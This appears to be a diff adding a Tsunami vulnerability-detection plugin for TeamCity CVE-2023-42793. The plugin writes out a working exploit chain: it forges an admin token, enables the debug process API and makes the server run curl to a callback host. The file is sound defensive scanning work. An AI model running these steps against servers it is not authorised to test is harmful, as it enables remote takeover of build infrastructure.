@@ -1,0 +1,189 @@
+# proto-file: proto/templated_plugin.proto
+# proto-message: TemplatedPlugin
+
+###############
+# PLUGIN INFO #
+###############
+
+info: {
+  type: VULN_DETECTION
+  name: "JetbrainsTeamCity_CVE_2023_42793"
+  author: 
+    "Robert Dick (robert@doyensec.com) for templated version, "
+    "Tsunami Team (tsunami-dev@google.com) for original Java version"
+  version: "2.0"
+}
+
+finding: {
+  main_id: {
+    publisher: "GOOGLE"
+    value: "CVE_2023_42793"
+  }
+  severity: CRITICAL
+  title: "TeamCity Auth Bypass RCE (CVE-2023-42793)"
+  description: 
+    "The TeamCity server contains a remote code execution vulnerability. A malicious actor with"
+    " network access can retrieve a jwt auth token with admin privilege, and execute"
+    " arbitrary process via server's debug API. CVE-2023-42793 affects all on-prem versions"
+    " of JetBrains TeamCity prior to 2023.05.4."
+  recommendation:
+    "To remediate CVE-2023-42793, please upgrade server version to 2023.05.4.\n"
+    "\n"
+    "Please see"
+    " https://blog.jetbrains.com/teamcity/2023/09/critical-security-issue-affecting-teamcity-on-premises-update-to-2023-05-4-now/"
+    " for the detailed remediation instructions."
+  related_id: {
+    publisher: "CVE"
+    value: "CVE-2023-42793"
+  }
+}
+
+###########
+# ACTIONS #
+###########
+
+
+actions: {
+  name: "fingerprint_teamcity"
+  http_request: {
+    method: GET
+    uri: "/"
+    response: {
+      expect_any: {
+        conditions: [
+          { body: {} contains: "TeamCity" },
+          { header: { name: "WWW-Authenticate" } contains: "TeamCity" }
+        ]
+      }
+    }
+  }
+}
+
+actions: {
+  name: "delete_existing_token"
+  http_request: {
+    method: DELETE
+    uri: "/app/rest/users/id:1/tokens/RPC2"
+  }
+}
+
+actions: {
+  name: "create_token"
+  http_request: {
+    method: POST
+    uri: "/app/rest/users/id:1/tokens/RPC2"
+    headers: [
+      { name: "Content-Type" value: "application/x-www-form-urlencoded" }
+    ]
+    response: {
+      http_status: 200
+      extract_all: {
+        patterns: [
+          {
+            from_body: {}
+            regexp: 'RPC2.*value=\"(.*)\"'
+            variable_name: "TOKEN"
+          }
+        ]
+      }
+    }
+  }
+  # we put our refresh and disable debug mode cleanup actions here too, since
+  # if we do it in the "enable_debug_mode" step, the token would be deleted first.
+  cleanup_actions: ["disable_debug_mode", "refresh_server", "delete_existing_token"]
+}
+
+actions: {
+  name: "enable_debug_mode"
+  http_request: {
+    method: POST
+    uri: "/admin/dataDir.html?action=edit&fileName=config%2Finternal.properties&content=rest.debug.processes.enable=true"
+    headers: [
+      { name: "Authorization" value: "Bearer {{ TOKEN }}" }
+    ]
+    response: {
+      http_status: 200
+    }
+  }
+}
+
+actions: {
+  name: "disable_debug_mode"
+  http_request: {
+    method: POST
+    uri: "/admin/dataDir.html?action=edit&fileName=config%2Finternal.properties&content=rest.debug.processes.enable=false"
+    headers: [
+      { name: "Authorization" value: "Bearer {{ TOKEN }}" }
+    ]
+    response: {
+      http_status: 200
+    }
+  }
+}
+
+actions: {
+  name: "refresh_server"
+  http_request: {
+    method: POST
+    uri: "/admin/admin.html?item=diagnostics&tab=dataDir&file=config/internal.properties"
+    headers: [
+      { name: "Authorization" value: "Bearer {{ TOKEN }}" }
+    ]
+    response: {
+      http_status: 200
+    }
+  }
+}
+
+# should be okay to sleep here for longer, given the fingerprint check.
+# long is needed because it's a server refresh.
+
+actions: {
+  name: "sleep_long"
+  utility: { sleep: { duration_ms: 10000 } }
+}
+
+actions: {
+  name: "trigger_callback"
+  http_request: {
+    method: POST
+    uri: "/app/rest/debug/processes?exePath=curl&params={{ T_CBS_URI }}"
+    headers: [
+      { name: "Authorization" value: "Bearer {{ TOKEN }}" }
+    ]
+    response: {
+      http_status: 200
+    }
+  }
+}
+
+# sleep shorter since it's just curl.
+
+actions: {
+  name: "sleep_short"
+  utility: { sleep: { duration_ms: 1000 } }
+}
+
+actions: {
+  name: "check_callback_server_logs"
+  callback_server: { action_type: CHECK }
+}
+
+#############
+# WORKFLOWS #
+#############
+
+workflows: {
+  condition: REQUIRES_CALLBACK_SERVER
+  actions: [
+    "fingerprint_teamcity",
+    "delete_existing_token",
+    "create_token",
+    "enable_debug_mode",
+    "refresh_server",
+    "sleep_long",
+    "trigger_callback",
+    "sleep_short",
+    "check_callback_server_logs"
+  ]
+}
